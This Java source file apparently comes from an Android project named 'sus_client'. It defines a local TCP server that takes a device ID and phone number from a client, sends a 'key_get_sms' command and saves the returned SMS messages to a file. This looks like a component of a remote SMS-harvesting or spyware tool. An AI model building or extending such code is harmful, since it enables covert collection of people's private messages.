package com.android.sus_client.utils.socket;

import android.content.Context;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;
import android.widget.Toast;

import org.json.JSONObject;

import java.io.FileOutputStream;
import java.io.IOException;
import java.net.InetAddress;
import java.net.ServerSocket;
import java.net.Socket;
import java.nio.charset.StandardCharsets;

public class TCPServer extends Thread {

    String KEY_GET_SMS = "key_get_sms";
    String USER_SMS_FILENAME = "UserSms.txt";

    private final static String TAG = TCPServer.class.getSimpleName();
    private final static String LOCAL_HOST = "127.0.0.1";
    private final static int LOCAL_PORT = 5050;

    private Context context;
    private Socket socket;

    public TCPServer(Context context, Socket socket) {
        this.context = context;
        this.socket = socket;
    }

    public void run() {
        ObjectReader reader = null;
        ObjectWriter writer = null;

        try {
            reader = new ObjectReader(socket);

            // access header sent by client
            String headerRes = reader.read(String.class);
            getLog("Header: Response - " + headerRes);
            if (headerRes != null) {
                JSONObject header = new JSONObject(headerRes);
                String deviceID = header.optString("deviceID", "null");
                String phoneNumber = header.optString("phoneNumber", "null");
                getLog("DeviceId:" + deviceID + " - PhoneNumber:" + phoneNumber);
            } else {
                throw new Exception("Header response is null");
            }

            JSONObject cmdObject = new JSONObject();
            cmdObject.put("execution_cmd", KEY_GET_SMS);
            cmdObject.put("data", null);
            writer = new ObjectWriter(socket);
            writer.write(cmdObject.toString());

            String userSmsArray = reader.read(String.class);
            getLog("Response: Sms - " + userSmsArray);
            FileOutputStream fos = context.openFileOutput(USER_SMS_FILENAME, Context.MODE_APPEND);
            fos.write(userSmsArray.getBytes(StandardCharsets.UTF_8));

        } catch (Exception e) {
            getLog("Exception--> " + e);
            e.printStackTrace();

        } finally {
            try {
                if (reader != null) reader.close();
                if (writer != null) writer.close();
                socket.close();
            } catch (IOException ignored) {
            }
        }
    }

    /**
     * static methods
     */
    private static void showToast(Context context, String msg) {
        Log.e(TAG, msg);
        new Handler(Looper.getMainLooper()).post(new Runnable() {
            @Override
            public void run() {
                Toast.makeText(context, ((msg == null) ? "null" : msg), Toast.LENGTH_LONG).show();
            }
        });
    }

    private static void getLog(String msg) {
        Log.e(TAG, msg);
    }

    public static void starts(Context context) throws IOException, ClassNotFoundException {
        ServerSocket serversocket = new ServerSocket(LOCAL_PORT, 0, InetAddress.getByName("localhost"));
        String address = serversocket.getInetAddress().getHostAddress() + ":" + serversocket.getLocalPort();
        getLog("connecting... " + address);

        while (true) {
            Socket clientSocket = serversocket.accept();
            getLog("connected");

            new TCPServer(context, clientSocket).start();
        }
    }

}